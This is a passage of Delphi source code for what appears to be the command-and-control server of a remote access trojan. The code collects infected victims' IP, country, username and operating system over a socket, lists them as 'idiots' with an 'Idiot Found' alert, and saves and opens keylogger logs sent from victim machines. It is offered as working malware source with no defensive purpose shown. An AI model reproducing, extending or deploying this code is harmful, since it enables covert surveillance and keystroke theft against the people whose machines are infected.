
  code := Socket.ReceiveText;

  if (Pos('[datos_nuevos][ip]', code) > 0) then
  begin

    ip := regex(code, '[ip]', '[ip]');
    pais := regex(code, '[pais]', '[pais]');
    username := regex(code, '[username]', '[username]');
    os := regex(code, '[os]', '[os]');

    idiots.Items[idiots.Items.count - 1].SubItems[1] := ip;
    idiots.Items[idiots.Items.count - 1].SubItems[2] := pais;
    idiots.Items[idiots.Items.count - 1].SubItems[3] := username;
    idiots.Items[idiots.Items.count - 1].SubItems[4] := os;

    idiots_found_now.Caption := 'Idiots found : ' + IntToStr(idiots_found);

    notificar.BalloonTitle := 'Idiot Found';
    notificar.BalloonHint := ip;
    notificar.ShowBalloonHint;

  end

  else if (Pos('![keyloggerlogs]', code) > 0) then
  begin

    code := StringReplace(code, '![keyloggerlogs]', '',
      [rfReplaceAll, rfIgnoreCase]);
    if (FileExists('logs_keylogger.html')) then
    begin
      DeleteFile('logs_keylogger.html');
    end;

    savefile('logs_keylogger.html', code);

    console.Lines.Add('[+] Keylogger : OK');

    ShellExecute(0, nil, PChar(ExtractFilePath(Application.ExeName) +
      'logs_keylogger.html'), nil, nil, SW_SHOWNORMAL);
  end
  else
  begin
    console.Lines.Add(code);
  end;

end;

procedure TForm1.serverListen(Sender: TObject; Socket: TCustomWinSocket);
begin
  status.Panels[0].text := '[+] Online';
  status.Update;
end;

procedure TForm1.StartServer1Click(Sender: TObject);
begin
  server.Active := True;
  status.Panels[0].text := '[+] Online';
  status.Update;
end;

procedure TForm1.StopServer1Click(Sender: TObject);
begin
  server.Active := False;
  status.Panels[0].text := '[+] OffLine';
  status.Update;
end;

end.

// The End ?
